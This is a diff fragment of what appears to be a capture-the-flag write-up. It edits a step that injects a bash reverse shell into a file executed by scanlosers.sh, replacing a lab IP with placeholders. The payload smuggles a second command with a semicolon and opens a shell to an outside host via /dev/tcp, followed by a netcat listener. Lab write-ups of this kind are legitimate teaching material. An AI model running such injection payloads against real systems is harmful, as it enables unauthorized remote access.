@@ -51,7 +51,7 @@ Looks like hackers is being run everytime scanlosers.sh runs so we try to write 
 So we try to write a bash reverse shell.        
 use the following command to echo the bash shell into hackers
 ```bash
-echo "         ; /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.14/1234 0>&1'  #" >> hackers
+echo "         ; /bin/bash -c 'bash -i >& /dev/tcp/ip_address/port 0>&1'  #" >> hackers
 ```
 Don't forget to fire up another netcat listener for this as well.
 
